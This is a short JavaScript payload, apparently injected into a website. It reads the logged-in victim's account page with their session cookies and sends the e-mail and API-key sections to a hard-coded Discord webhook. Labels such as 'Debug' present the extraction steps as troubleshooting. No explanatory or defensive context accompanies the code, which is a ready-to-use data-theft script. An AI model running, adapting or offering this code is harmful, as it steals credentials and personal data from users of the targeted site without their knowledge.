(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  const send = (title, desc) =>
    fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({embeds: [{title, description: desc.slice(0,4000), color: 0x00ff00}]})
    });

  try {
    const h = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    // Debug: find the areas where the missing values should be
    const appDiv = (h.match(/<!-- Info for Apps -->[\s\S]{0,500}/) || ['not found'])[0];
    const emailArea = (h.match(/E-mail[\s\S]{0,300}/) || ['not found'])[0];
    const apiArea = (h.match(/notranslate[\s\S]{0,200}[a-f0-9]{10,}[\s\S]{0,100}/) || ['not found'])[0];

    await send('🔍 Debug: App Div', appDiv);
    await new Promise(r => setTimeout(r, 1000));
    await send('🔍 Debug: Email Area', emailArea);
    await new Promise(r => setTimeout(r, 1000));
    await send('🔍 Debug: API Key Area', apiArea);

  } catch(e) {
    await send('❌ Error', String(e));
  }
})();
